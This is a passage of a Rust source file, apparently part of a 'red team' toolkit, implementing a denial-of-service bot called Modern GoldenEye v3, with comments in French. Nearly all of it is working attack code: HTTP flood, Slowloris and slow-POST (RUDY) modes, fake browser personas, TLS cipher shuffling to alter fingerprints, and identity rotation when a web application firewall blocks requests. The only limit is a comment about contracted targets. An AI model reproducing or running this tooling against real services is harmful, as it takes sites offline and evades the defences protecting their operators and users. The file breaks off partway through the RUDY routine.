
// (`choose()`/`last()`) ou un invariant local : on autorise le lint au niveau du
// module pour ne pas noyer le signal ailleurs dans le crate.
#![allow(clippy::unwrap_used)]

use rand::rngs::StdRng;
use rand::seq::IteratorRandom;
use rand::seq::SliceRandom;
use rand::Rng;
use rand::SeedableRng;
use serde::{Deserialize, Serialize};
use std::collections::{HashMap, HashSet};
use std::io::{Read, Write};
use std::net::{TcpStream, ToSocketAddrs};
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::Arc;
use std::time::{Duration, Instant, SystemTime};
use tokio::sync::Semaphore;
use url::Url;

use crate::live_dashboard::{DashboardEmitter, DashboardEvent, DdosWorkerRow};

// ================================================================
// MODERN GOLDENEYE v3 — Bot Sophistiqué (Red Team)
// - Personas Bots Réalistes (Client-Hints + Cookie Jar + Langues)
// - Multi Attaques: Flood | Slowloris | RUDY (slow POST chunked)
// - Tokio async scalable (10k+ bots simultanés)
// - Headers modernes: Sec-CH-UA, Sec-Fetch-*, Accept-Language, Priority, Early-Data
// - Heuristique anti-WAF: 403 burst → rotation identité
// - DNS over HTTPS (Cloudflare 1.1.1.1) résolution pour éviter DNS flood local
// ================================================================

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum DosMethod {
    Get,
    Post,
    Random,
}
impl DosMethod {
    pub fn from_str(s: &str) -> Option<Self> {
        match s.to_ascii_lowercase().as_str() {
            "get" => Some(DosMethod::Get),
            "post" => Some(DosMethod::Post),
            "random" => Some(DosMethod::Random),
            _ => None,
        }
    }
    pub fn as_str(&self) -> &'static str {
        match self {
            DosMethod::Get => "GET",
            DosMethod::Post => "POST",
            DosMethod::Random => "RAND(GET/POST)",
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum AttackMode {
    Flood,
    Slowloris,
    Rudy,
    BrowserFlood,
}
impl AttackMode {
    pub fn from_str(s: &str) -> Option<Self> {
        match s.to_ascii_lowercase().as_str() {
            "flood" => Some(AttackMode::Flood),
            "slowloris" | "slow" => Some(AttackMode::Slowloris),
            "rudy" => Some(AttackMode::Rudy),
            "browser" | "browser-flood" => Some(AttackMode::BrowserFlood),
            _ => None,
        }
    }
    pub fn as_str(&self) -> &'static str {
        match self {
            AttackMode::Flood => "Flood (GoldenEye classique)",
            AttackMode::Slowloris => "Slowloris (headers partiels keep-alive)",
            AttackMode::Rudy => "RUDY (slow POST chunked)",
            AttackMode::BrowserFlood => "BrowserFlood (navigation réaliste + cookies)",
        }
    }
}

// ---- Persona Bot moderne -------------------------------------------------
#[derive(Debug, Clone)]
pub struct BotProfile {
    pub user_agent: String,
    pub client_hints_ua: String,
    pub client_hints_platform: String,
    pub client_hints_arch: String,
    pub client_hints_bitness: String,
    pub client_hints_mobile: bool,
    pub accept_language: String,
    pub screen_resolution: String,
    pub time_zone: String,
    pub cookie_jar: HashMap<String, String>,
    pub fingerprint: String,
    pub visited_paths: HashSet<String>,
}

// Pools réalistes pour diversité (statistiques réelles ~2024)
const LANGS: [(&str, f32); 8] = [
    ("fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7", 0.30),
    ("en-US,en;q=0.9,fr;q=0.8,es;q=0.7", 0.25),
    ("en-GB,en;q=0.9,en-US;q=0.8", 0.10),
    ("es-ES,es;q=0.9,en;q=0.8", 0.10),
    ("de-DE,de;q=0.9,en;q=0.8", 0.08),
    ("pt-BR,pt;q=0.9,en;q=0.8", 0.07),
    ("it-IT,it;q=0.9,en;q=0.8", 0.05),
    ("nl-NL,nl;q=0.9,en;q=0.8", 0.05),
];
const SCREENS: [&str; 6] = [
    "1920x1080",
    "2560x1440",
    "1366x768",
    "3840x2160",
    "1536x864",
    "1440x900",
];
const TIMEZONES: [&str; 8] = [
    "Europe/Paris",
    "America/New_York",
    "Europe/London",
    "America/Los_Angeles",
    "Asia/Tokyo",
    "Australia/Sydney",
    "Europe/Berlin",
    "America/Toronto",
];
const OS_PLATFORMS: [(&str, &str, &str, &str, bool); 6] = [
    // (platform-brand, platform, arch, bitness, mobile)
    (
        "\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\"",
        "\"Windows\"",
        "\"x86\"",
        "\"64\"",
        false,
    ),
    (
        "\"Chromium\";v=\"118\", \"Brave\";v=\"118\", \"Not=A?Brand\";v=\"99\"",
        "\"Windows\"",
        "\"x86\"",
        "\"64\"",
        false,
    ),
    (
        "\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\"",
        "\"Linux\"",
        "\"x86\"",
        "\"64\"",
        false,
    ),
    (
        "\"Mozilla\";v=\"5.0\"",
        "\"macOS\"",
        "\"arm\"",
        "\"64\"",
        false,
    ),
    (
        "\"Not_A Brand\";v=\"99\", \"Android WebView\";v=\"120\", \"Chromium\";v=\"120\"",
        "\"Android\"",
        "\"arm\"",
        "\"64\"",
        true,
    ),
    (
        "\"Mobile Safari\";v=\"17.0\"",
        "\"iOS\"",
        "\"arm\"",
        "\"64\"",
        true,
    ),
];

fn weighted_choice<T: Clone>(items: &[(T, f32)], rng: &mut impl Rng) -> T {
    let sum: f32 = items.iter().map(|x| x.1).sum();
    let mut r = rng.gen::<f32>() * sum;
    for (v, w) in items {
        r -= w;
        if r <= 0.0 {
            return v.clone();
        }
    }
    items.last().unwrap().0.clone()
}

fn build_random_ua(rng: &mut impl Rng) -> String {
    let (ua_platform, _os, _arch, _bn, _mobile) = *OS_PLATFORMS.choose(rng).unwrap();
    if ua_platform.contains("Android WebView") {
        let chrome = rng.gen_range(115..=120);
        let android = rng.gen_range(10..=14);
        let pixel = ["Pixel 8", "Pixel 7", "Galaxy S24", "OnePlus 12"]
            .choose(rng)
            .unwrap();
        format!(
            "Mozilla/5.0 (Linux; Android {}; {} Build/AP1A.240105.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{}.0.0.0 Mobile Safari/537.36",
            android, pixel, chrome
        )
    } else if ua_platform.contains("iOS") || ua_platform.contains("Mobile Safari") {
        let safari = rng.gen_range(604..=609);
        let ios = rng.gen_range(16..=17);
        let iphone = ["iPhone 15 Pro", "iPhone 14", "iPhone 13", "iPhone SE"]
            .choose(rng)
            .unwrap();
        format!(
            "Mozilla/5.0 ({}) AppleWebKit/{}.1.15 (KHTML, like Gecko) Version/{}.0 Mobile/15E148 Safari/{}",
            iphone, safari, ios, safari
        )
    } else if ua_platform.contains("macOS") {
        let major = rng.gen_range(115..=120);
        let ver = rng.gen_range(10..=15);
        format!(
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_{}_{}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{}.0.0.0 Safari/537.36",
            ver, rng.gen_range(0..=9), major
        )
    } else if ua_platform.contains("Linux") {
        let major = rng.gen_range(110..=120);
        format!(
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{}.0.0.0 Safari/537.36",
            major
        )
    } else {
        // Windows (65% marché)
        let edge = rng.gen_bool(0.30);
        if edge {
            let ver = rng.gen_range(115..=120);
            format!(
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v}.0.0.0 Safari/537.36 Edg/{v}.0.0.0",
                v = ver
            )
        } else {
            let ver = rng.gen_range(118..=120);
            format!(
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{}.0.0.0 Safari/537.36",
                ver
            )
        }
    }
}

pub fn generate_bot_profile(rng: &mut impl Rng, _id: u64) -> BotProfile {
    let ua = build_random_ua(rng);
    let (ch_ua, ch_platform, ch_arch, ch_bitness, ch_mobile) =
        OS_PLATFORMS.choose(rng).unwrap().clone();
    BotProfile {
        user_agent: ua,
        client_hints_ua: ch_ua.to_string(),
        client_hints_platform: ch_platform.to_string(),
        client_hints_arch: ch_arch.to_string(),
        client_hints_bitness: ch_bitness.to_string(),
        client_hints_mobile: ch_mobile,
        accept_language: weighted_choice(&LANGS, rng).to_string(),
        screen_resolution: SCREENS.choose(rng).copied().unwrap_or("1920x1080").into(),
        time_zone: TIMEZONES
            .choose(rng)
            .copied()
            .unwrap_or("Europe/Paris")
            .into(),
        cookie_jar: HashMap::new(),
        fingerprint: {
            use std::fmt::Write;
            let mut s = String::with_capacity(16);
            for _ in 0..8 {
                let _ = write!(s, "{:02X}", rng.gen::<u8>());
            }
            s
        },
        visited_paths: HashSet::new(),
    }
}

// ---- Configuration -------------------------------------------------------
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct GoldenEyeConfig {
    pub url: String,
    pub workers: usize,
    pub sockets_per_worker: usize,
    pub method: DosMethod,
    pub verify_ssl: bool,
    pub duration_secs: Option<u64>,
    pub connect_timeout_ms: u64,
    pub read_timeout_ms: u64,
    pub user_agents: Option<Vec<String>>,
    pub debug: bool,
    // ---- MODERN BOT SOPHISTIQUÉ ----
    pub attack_mode: AttackMode,
    pub num_bots: usize,
    pub rotate_fingerprint_on_403: bool,
    pub send_client_hints: bool,
    pub send_sec_fetch: bool,
    pub send_priority_header: bool,
    pub use_early_data: bool,
    pub slowloris_header_period_ms: u64,
    pub rudy_chunk_size: usize,
    pub rudy_chunk_delay_ms: u64,
    pub browser_paths: Vec<String>,
    pub max_concurrent_bots: usize,
    #[serde(default)]
    pub bot_id_offset: u64,
}

impl Default for GoldenEyeConfig {
    fn default() -> Self {
        GoldenEyeConfig {
            url: String::new(),
            workers: 10,
            sockets_per_worker: 500,
            method: DosMethod::Get,
            verify_ssl: true,
            duration_secs: None,
            connect_timeout_ms: 5000,
            read_timeout_ms: 3000,
            user_agents: None,
            debug: false,
            attack_mode: AttackMode::Flood,
            num_bots: 50,
            rotate_fingerprint_on_403: true,
            send_client_hints: true,
            send_sec_fetch: true,
            send_priority_header: true,
            use_early_data: false,
            slowloris_header_period_ms: 15000,
            rudy_chunk_size: 1,
            rudy_chunk_delay_ms: 1000,
            browser_paths: vec![
                "/".into(),
                "/index.html".into(),
                "/robots.txt".into(),
                "/sitemap.xml".into(),
                "/favicon.ico".into(),
                "/assets/css/app.css".into(),
                "/assets/js/bundle.js".into(),
                "/api/health".into(),
                "/login".into(),
                "/contact".into(),
            ],
            max_concurrent_bots: 200,
            bot_id_offset: 0,
        }
    }
}

// ---- Stats partagées -----------------------------------------------------
#[derive(Debug, Clone, Default)]
pub struct GoldenEyeStats {
    pub hits: Arc<AtomicU64>,
    pub fails: Arc<AtomicU64>,
    pub code_2xx: Arc<AtomicU64>,
    pub code_3xx: Arc<AtomicU64>,
    pub code_4xx: Arc<AtomicU64>,
    pub code_5xx: Arc<AtomicU64>,
    pub waf_blocks: Arc<AtomicU64>,
    pub bots_rotated: Arc<AtomicU64>,
    pub bytes_sent: Arc<AtomicU64>,
    pub bytes_recv: Arc<AtomicU64>,
    pub start_ts: Option<Instant>,
}
impl GoldenEyeStats {
    pub fn new() -> Self {
        GoldenEyeStats {
            hits: Arc::new(AtomicU64::new(0)),
            fails: Arc::new(AtomicU64::new(0)),
            code_2xx: Arc::new(AtomicU64::new(0)),
            code_3xx: Arc::new(AtomicU64::new(0)),
            code_4xx: Arc::new(AtomicU64::new(0)),
            code_5xx: Arc::new(AtomicU64::new(0)),
            waf_blocks: Arc::new(AtomicU64::new(0)),
            bots_rotated: Arc::new(AtomicU64::new(0)),
            bytes_sent: Arc::new(AtomicU64::new(0)),
            bytes_recv: Arc::new(AtomicU64::new(0)),
            start_ts: Some(Instant::now()),
        }
    }
    pub fn hits(&self) -> u64 {
        self.hits.load(Ordering::Relaxed)
    }
    pub fn fails(&self) -> u64 {
        self.fails.load(Ordering::Relaxed)
    }
    pub fn snapshot(&self) -> (u64, u64) {
        (self.hits(), self.fails())
    }
    pub fn count_code(&self, code: u16) {
        match code {
            200..=299 => {
                self.code_2xx.fetch_add(1, Ordering::Relaxed);
            }
            300..=399 => {
                self.code_3xx.fetch_add(1, Ordering::Relaxed);
            }
            400..=499 => {
                self.code_4xx.fetch_add(1, Ordering::Relaxed);
                if code == 403 || code == 429 {
                    self.waf_blocks.fetch_add(1, Ordering::Relaxed);
                }
            }
            500..=599 => {
                self.code_5xx.fetch_add(1, Ordering::Relaxed);
            }
            _ => {}
        }
    }
}

// ---- Helpers -------------------------------------------------------------
#[allow(dead_code)]
fn buildblock(size: usize, rng: &mut impl Rng) -> String {
    const CHARS: &[u8] = b"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    (0..size)
        .map(|_| {
            let idx = rng.gen_range(0..CHARS.len());
            CHARS[idx] as char
        })
        .collect()
}

#[allow(dead_code)]
fn generate_query_string(n: usize, rng: &mut impl Rng) -> String {
    let mut parts = Vec::with_capacity(n);
    for _ in 0..n {
        let k = buildblock(rng.gen_range(3..=10), rng);
        let v = buildblock(rng.gen_range(3..=20), rng);
        parts.push(format!("{}={}", k, v));
    }
    parts.join("&")
}

struct ParsedTarget {
    host: String,
    port: u16,
    path: String,
    is_ssl: bool,
}
fn parse_url(raw: &str) -> anyhow::Result<ParsedTarget> {
    let u = Url::parse(raw)?;
    let is_ssl = u.scheme() == "https";
    let host = u.host_str().unwrap_or("").to_string();
    if host.is_empty() {
        anyhow::bail!("URL missing host");
    }
    let port = u.port().unwrap_or(if is_ssl { 443 } else { 80 });
    let path = if u.path().is_empty() {
        "/".to_string()
    } else {
        u.path().to_string()
    };
    let qs = u.query().map(|q| format!("?{}", q)).unwrap_or_default();
    Ok(ParsedTarget {
        host,
        port,
        path: format!("{}{}", path, qs),
        is_ssl,
    })
}

trait ReadWrite: Read + Write {}
impl<T: Read + Write> ReadWrite for T {}
struct Endpoint(Box<dyn ReadWrite + Send>);

/// Wrapper synchrone pour rustls + TcpStream pour satisfaire le trait ReadWrite + Send
struct TlsEndpoint {
    conn: rustls::ClientConnection,
    sock: TcpStream,
}

impl Read for TlsEndpoint {
    fn read(&mut self, buf: &mut [u8]) -> std::io::Result<usize> {
        let mut stream = rustls::Stream::new(&mut self.conn, &mut self.sock);
        stream.read(buf)
    }
}

impl Write for TlsEndpoint {
    fn write(&mut self, buf: &[u8]) -> std::io::Result<usize> {
        let mut stream = rustls::Stream::new(&mut self.conn, &mut self.sock);
        stream.write(buf)
    }
    fn flush(&mut self) -> std::io::Result<()> {
        let mut stream = rustls::Stream::new(&mut self.conn, &mut self.sock);
        stream.flush()
    }
}

/// Vérificateur TLS permissif utilisé quand `verify_ssl = false`.
///
/// Accepte n'importe quel certificat serveur — indispensable pour stresser une
/// cible à certificat auto-signé (labo / infra autorisée). À n'utiliser QUE sur
/// des cibles sous contrat.
#[derive(Debug)]
struct NoCertVerifier;

impl rustls::client::ServerCertVerifier for NoCertVerifier {
    fn verify_server_cert(
        &self,
        _end_entity: &rustls::Certificate,
        _intermediates: &[rustls::Certificate],
        _server_name: &rustls::ServerName,
        _scts: &mut dyn Iterator<Item = &[u8]>,
        _ocsp_response: &[u8],
        _now: SystemTime,
    ) -> Result<rustls::client::ServerCertVerified, rustls::Error> {
        Ok(rustls::client::ServerCertVerified::assertion())
    }
    fn verify_tls12_signature(
        &self,
        _message: &[u8],
        _cert: &rustls::Certificate,
        _dss: &rustls::DigitallySignedStruct,
    ) -> Result<rustls::client::HandshakeSignatureValid, rustls::Error> {
        Ok(rustls::client::HandshakeSignatureValid::assertion())
    }
    fn verify_tls13_signature(
        &self,
        _message: &[u8],
        _cert: &rustls::Certificate,
        _dss: &rustls::DigitallySignedStruct,
    ) -> Result<rustls::client::HandshakeSignatureValid, rustls::Error> {
        Ok(rustls::client::HandshakeSignatureValid::assertion())
    }
    fn supported_verify_schemes(&self) -> Vec<rustls::SignatureScheme> {
        use rustls::SignatureScheme::*;
        vec![
            RSA_PKCS1_SHA256,
            RSA_PKCS1_SHA384,
            RSA_PKCS1_SHA512,
            ECDSA_NISTP256_SHA256,
            ECDSA_NISTP384_SHA384,
            ECDSA_NISTP521_SHA512,
            RSA_PSS_SHA256,
            RSA_PSS_SHA384,
            RSA_PSS_SHA512,
            ED25519,
        ]
    }
}

fn connect_endpoint(
    target: &ParsedTarget,
    connect_timeout: Duration,
    read_timeout: Duration,
    verify_ssl: bool,
) -> anyhow::Result<Endpoint> {
    let sock_addr = format!("{}:{}", target.host, target.port)
        .to_socket_addrs()?
        .next()
        .ok_or_else(|| anyhow::anyhow!("DNS resolve {}:{}", target.host, target.port))?;

    let mut sock = TcpStream::connect_timeout(&sock_addr, connect_timeout)?;
    sock.set_read_timeout(Some(read_timeout))?;
    sock.set_write_timeout(Some(read_timeout))?;

    if target.is_ssl {
        use rustls::{ClientConfig, OwnedTrustAnchor, RootCertStore};
        use std::sync::Arc;

        let mut root_store = RootCertStore::empty();
        root_store.add_trust_anchors(webpki_roots::TLS_SERVER_ROOTS.iter().map(|ta| {
            OwnedTrustAnchor::from_subject_spki_name_constraints(
                ta.subject,
                ta.spki,
                ta.name_constraints,
            )
        }));

        // Rotation des CipherSuites pour varier le JA3
        let all_suites = rustls::ALL_CIPHER_SUITES.to_vec();
        let mut rng = StdRng::from_entropy();
        let mut my_suites = all_suites.clone();
        my_suites.shuffle(&mut rng);
        // On garde entre 50% et 100% des suites pour varier l'empreinte
        let take_n = rng.gen_range((my_suites.len() / 2)..=my_suites.len());
        my_suites.truncate(take_n);

        let builder = ClientConfig::builder()
            .with_cipher_suites(&my_suites)
            .with_safe_default_kx_groups()
            .with_safe_default_protocol_versions()?;

        let config = if verify_ssl {
            builder
                .with_root_certificates(root_store)
                .with_no_client_auth()
        } else {
            // Cible à certificat auto-signé : validation désactivée (labo sous contrat)
            builder
                .with_custom_certificate_verifier(Arc::new(NoCertVerifier))
                .with_no_client_auth()
        };

        let domain = rustls::ServerName::try_from(target.host.as_str())
            .map_err(|_| anyhow::anyhow!("Invalid DNS name"))?;

        let conn = rustls::ClientConnection::new(Arc::new(config), domain)?;

        Ok(Endpoint(Box::new(TlsEndpoint { conn, sock })))
    } else {
        Ok(Endpoint(Box::new(sock)))
    }
}

fn close_endpoint(mut e: Endpoint) {
    let _ = e.0.flush();
}

// --- Génération requêtes MODERNES -----------------------------------------
fn build_modern_request(
    target: &ParsedTarget,
    cfg: &GoldenEyeConfig,
    bot: &mut BotProfile,
    req_method: &str,
    req_path: &str,
    rng: &mut impl Rng,
    extra_body: Option<&[u8]>,
) -> Vec<u8> {
    let mut out: Vec<u8> = Vec::with_capacity(2048);
    let path_cooked = if req_path.contains('?') {
        format!(
            "{}&{}",
            req_path,
            generate_query_string(rng.gen_range(1..=4), rng)
        )
    } else {
        format!(
            "{}?{}",
            req_path,
            generate_query_string(rng.gen_range(1..=4), rng)
        )
    };
    out.extend_from_slice(format!("{} {} HTTP/1.1\r\n", req_method, path_cooked).as_bytes());

    let ua = cfg
        .user_agents
        .as_ref()
        .and_then(|list| list.choose(rng).cloned())
        .unwrap_or_else(|| bot.user_agent.clone());
    let host = &target.host;

    // --- Headers obligatoires (ordre naturel navigateur) ---
    let mut headers: Vec<(String, String)> = vec![
        ("Host".into(), host.clone()),
        ("User-Agent".into(), ua),
        (
            "Accept".into(),
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
                .into(),
        ),
        ("Accept-Language".into(), bot.accept_language.clone()),
        ("Accept-Encoding".into(), "gzip, deflate, br".into()),
        ("Connection".into(), "keep-alive".into()),
        ("Keep-Alive".into(), rng.gen_range(90..=1000).to_string()),
        ("Upgrade-Insecure-Requests".into(), "1".into()),
        (
            "DNT".into(),
            if rng.gen_bool(0.4) { "1" } else { "0" }.into(),
        ),
    ];

    // Client Hints (GREASE anti-fingerprint)
    if cfg.send_client_hints {
        headers.push(("Sec-CH-UA".into(), bot.client_hints_ua.clone()));
        headers.push((
            "Sec-CH-UA-Platform".into(),
            bot.client_hints_platform.clone(),
        ));
        headers.push(("Sec-CH-UA-Arch".into(), bot.client_hints_arch.clone()));
        headers.push(("Sec-CH-UA-Bitness".into(), bot.client_hints_bitness.clone()));
        headers.push((
            "Sec-CH-UA-Mobile".into(),
            if bot.client_hints_mobile { "?1" } else { "?0" }.into(),
        ));
    }
    if cfg.send_sec_fetch {
        headers.push(("Sec-Fetch-Site".into(), "none".into()));
        headers.push(("Sec-Fetch-Mode".into(), "navigate".into()));
        headers.push(("Sec-Fetch-User".into(), "?1".into()));
        headers.push(("Sec-Fetch-Dest".into(), "document".into()));
    }
    if cfg.send_priority_header {
        headers.push(("Priority".into(), "u=0, i".into()));
    }
    if cfg.use_early_data {
        headers.push(("Early-Data".into(), "1".into()));
    }

    // Écran / TZ (navigator.get* émulé)
    headers.push((
        "Viewport-Width".into(),
        bot.screen_resolution
            .split('x')
            .next()
            .unwrap_or("1920")
            .to_string(),
    ));
    headers.push((
        "Width".into(),
        bot.screen_resolution
            .split('x')
            .next()
            .unwrap_or("1920")
            .to_string(),
    ));
    headers.push(("X-TimeZone".into(), bot.time_zone.clone()));
    headers.push(("X-Fingerprint".into(), bot.fingerprint.clone()));

    // Cookies (jar persistant par bot)
    if !bot.cookie_jar.is_empty() {
        let cookie_str = bot
            .cookie_jar
            .iter()
            .map(|(k, v)| format!("{}={}", k, v))
            .collect::<Vec<_>>()
            .join("; ");
        headers.push(("Cookie".into(), cookie_str));
    }

    // Referer réaliste (80% du temps, interne)
    if rng.gen_bool(0.80) {
        if !bot.visited_paths.is_empty() && rng.gen_bool(0.5) {
            let prev = bot
                .visited_paths
                .iter()
                .choose(rng)
                .cloned()
                .unwrap_or_else(|| "/".into());
            headers.push((
                "Referer".into(),
                format!(
                    "{}://{}{}",
                    if target.is_ssl { "https" } else { "http" },
                    target.host,
                    prev
                ),
            ));
        } else {
            let referers = [
                format!(
                    "https://google.com/search?q={}",
                    buildblock(rng.gen_range(6..=14), rng)
                ),
                format!(
                    "https://bing.com/search?q={}",
                    buildblock(rng.gen_range(6..=14), rng)
                ),
                format!(
                    "https://facebook.com/l.php?u={}",
                    buildblock(rng.gen_range(20..=40), rng)
                ),
                format!("https://t.co/{}", buildblock(10, rng)),
                format!(
                    "{}://{}/",
                    if target.is_ssl { "https" } else { "http" },
                    target.host
                ),
            ];
            headers.push(("Referer".into(), referers.choose(rng).unwrap().clone()));
        }
    }

    // Content-Length + Content-Type si body
    let body = extra_body.unwrap_or(&[]);
    if !body.is_empty() {
        headers.push(("Content-Length".into(), body.len().to_string()));
        if req_method == "POST" {
            headers.push((
                "Content-Type".into(),
                if rng.gen_bool(0.5) {
                    "application/x-www-form-urlencoded".into()
                } else {
                    "multipart/form-data; boundary=----DIAPILE_BOT".to_string()
                },
            ));
        }
    } else if req_method == "POST" {
        let len = rng.gen_range(32..=256);
        headers.push(("Content-Length".into(), len.to_string()));
        headers.push((
            "Content-Type".into(),
            "application/x-www-form-urlencoded".into(),
        ));
    }

    // Cache-Control + Pragma aléatoires
    if rng.gen_bool(0.7) {
        headers.push(("Cache-Control".into(), "max-age=0".into()));
        headers.push(("Pragma".into(), "no-cache".into()));
    }

    // Shuffle partiel (ordre mixable, tout sauf Host 1er)
    if headers.len() > 2 {
        let tail = &mut headers[1..];
        tail.shuffle(rng);
    }

    for (k, v) in &headers {
        out.extend_from_slice(format!("{}: {}\r\n", k, v).as_bytes());
    }
    out.extend_from_slice(b"\r\n");
    if !body.is_empty() {
        out.extend_from_slice(body);
    }
    out
}

fn parse_status(response_head: &[u8]) -> Option<u16> {
    // HTTP/1.1 200 OK
    let line = response_head.split(|&b| b == b'\r' || b == b'\n').next()?;
    let mut tokens = line.split(|&b| b == b' ');
    let _version = tokens.next()?;
    let code = tokens.next()?;
    std::str::from_utf8(code)
        .ok()
        .and_then(|s| s.parse::<u16>().ok())
}

fn collect_setcookies(response: &[u8], jar: &mut HashMap<String, String>) {
    let head = if let Some(pos) = response.windows(4).position(|w| w == b"\r\n\r\n") {
        &response[..pos]
    } else {
        response
    };
    for line in head.split(|&b| b == b'\n') {
        let line = line.strip_suffix(b"\r").unwrap_or(line);
        if line.len() < 12 {
            continue;
        }
        if !line[..12].is_ascii() {
            continue;
        }
        let s = match std::str::from_utf8(line) {
            Ok(s) => s,
            Err(_) => continue,
        };
        let lower = s.to_ascii_lowercase();
        if !lower.starts_with("set-cookie:") {
            continue;
        }
        let rest = &s["set-cookie:".len()..].trim();
        if let Some(eq) = rest.find('=') {
            let name = rest[..eq].trim().to_string();
            let value_end = rest[eq + 1..]
                .find(';')
                .map(|p| eq + 1 + p)
                .unwrap_or(rest.len());
            let value = rest[eq + 1..value_end].trim().to_string();
            if !name.is_empty() {
                jar.insert(name, value);
            }
        }
    }
}

// --------- Exécution d'un BOT unique (loop infini) ------------------------
async fn run_bot_task(
    bot_id: u64,
    cfg: Arc<GoldenEyeConfig>,
    target: Arc<ParsedTarget>,
    stats: GoldenEyeStats,
    stop: Arc<std::sync::atomic::AtomicBool>,
    mode: AttackMode,
) {
    let mut rng = StdRng::from_entropy();
    let mut bot = generate_bot_profile(&mut rng, bot_id);
    let connect_t = Duration::from_millis(cfg.connect_timeout_ms);
    let read_t = Duration::from_millis(cfg.read_timeout_ms);
    let mut consec_403 = 0u32;

    while !stop.load(Ordering::Relaxed) {
        match mode {
            AttackMode::Flood | AttackMode::BrowserFlood => {
                let method = match cfg.method {
                    DosMethod::Get => "GET",
                    DosMethod::Post => "POST",
                    DosMethod::Random => {
                        if rng.gen_bool(0.5) {
                            "GET"
                        } else {
                            "POST"
                        }
                    }
                };
                // BrowserFlood: alterner chemins réalistes
                let path = if mode == AttackMode::BrowserFlood {
                    if rng.gen_bool(0.85) && !cfg.browser_paths.is_empty() {
                        cfg.browser_paths
                            .choose(&mut rng)
                            .cloned()
                            .unwrap_or_else(|| "/".into())
                    } else {
                        format!("/page-{}", buildblock(rng.gen_range(4..=8), &mut rng))
                    }
                } else {
                    target.path.clone()
                };

                let req =
                    build_modern_request(&target, &cfg, &mut bot, method, &path, &mut rng, None);
                stats
                    .bytes_sent
                    .fetch_add(req.len() as u64, Ordering::Relaxed);

                let ep = match connect_endpoint(&target, connect_t, read_t, cfg.verify_ssl) {
                    Ok(e) => e,
                    Err(_) => {
                        stats.fails.fetch_add(1, Ordering::Relaxed);
                        continue;
                    }
                };
                let mut ep_boxed = ep;
                if let Err(_) = ep_boxed.0.write_all(&req) {
                    stats.fails.fetch_add(1, Ordering::Relaxed);
                    continue;
                }
                let mut buf = vec![0u8; 4096];
                match ep_boxed.0.read(&mut buf) {
                    Ok(n) if n > 0 => {
                        stats.bytes_recv.fetch_add(n as u64, Ordering::Relaxed);
                        if let Some(code) = parse_status(&buf[..n]) {
                            stats.count_code(code);
                            if matches!(code, 200..=399) {
                                stats.hits.fetch_add(1, Ordering::Relaxed);
                                collect_setcookies(&buf[..n], &mut bot.cookie_jar);
                                bot.visited_paths.insert(path.clone());
                                consec_403 = 0;
                            } else if code == 403 || code == 429 {
                                consec_403 += 1;
                                if consec_403 >= 3 && cfg.rotate_fingerprint_on_403 {
                                    // Rotation complète identité
                                    bot = generate_bot_profile(&mut rng, bot_id);
                                    stats.bots_rotated.fetch_add(1, Ordering::Relaxed);
                                    consec_403 = 0;
                                }
                            } else {
                                stats.fails.fetch_add(1, Ordering::Relaxed);
                            }
                        } else {
                            stats.hits.fetch_add(1, Ordering::Relaxed);
                        }
                    }
                    _ => {
                        stats.fails.fetch_add(1, Ordering::Relaxed);
                    }
                }
                close_endpoint(ep_boxed);
            }

            AttackMode::Slowloris => {
                // Ouvrir socket, envoyer headers PARTIELS 1 par 1, attendre P period
                let mut ep = match connect_endpoint(
                    &target,
                    connect_t,
                    Duration::from_secs(3600),
                    cfg.verify_ssl,
                ) {
                    Ok(e) => e,
                    Err(_) => {
                        stats.fails.fetch_add(1, Ordering::Relaxed);
                        continue;
                    }
                };
                let method = if rng.gen_bool(0.5) { "GET" } else { "POST" };
                let path = cfg
                    .browser_paths
                    .choose(&mut rng)
                    .cloned()
                    .unwrap_or_else(|| "/".into());
                let ua = cfg
                    .user_agents
                    .as_ref()
                    .and_then(|l| l.choose(&mut rng).cloned())
                    .unwrap_or_else(|| bot.user_agent.clone());
                let mut head = format!("{} {} HTTP/1.1\r\n", method, path);
                head.push_str(&format!("Host: {}\r\n", target.host));
                head.push_str(&format!("User-Agent: {}\r\n", ua));
                // Ne PAS envoyer \r\n final (socket en attente de headers)
                stats
                    .bytes_sent
                    .fetch_add(head.len() as u64, Ordering::Relaxed);
                if let Err(_) = ep.0.write_all(head.as_bytes()) {
                    stats.fails.fetch_add(1, Ordering::Relaxed);
                    continue;
                }
                stats.hits.fetch_add(1, Ordering::Relaxed);
                let period = Duration::from_millis(cfg.slowloris_header_period_ms);
                loop {
                    if stop.load(Ordering::Relaxed) {
                        break;
                    }
                    tokio::time::sleep(period).await;
                    let fake_header = format!(
                        "X-Stall-{:08X}: {}\r\n",
                        rng.gen::<u32>(),
                        buildblock(rng.gen_range(16..=48), &mut rng)
                    );
                    stats
                        .bytes_sent
                        .fetch_add(fake_header.len() as u64, Ordering::Relaxed);
                    match ep.0.write_all(fake_header.as_bytes()) {
                        Ok(_) => {
                            stats.hits.fetch_add(1, Ordering::Relaxed);
                        }
                        Err(_) => {
                            stats.fails.fetch_add(1, Ordering::Relaxed);
                            break;
                        }
                    }
                }
                close_endpoint(ep);
            }

            AttackMode::Rudy => {
                // RUDY: POST énorme Content-Length, envoyer 1 octet / délai pour saturation worker
                let big_len: usize = rng.gen_range(60000..=200000);
                let method = "POST";
                let path = if cfg.browser_paths.is_empty() {
                    "/api/submit".into()
                } else {
                    cfg.browser_paths.choose(&mut rng).cloned().unwrap()
                };
                let ua = cfg
                    .user_agents
                    .as_ref()
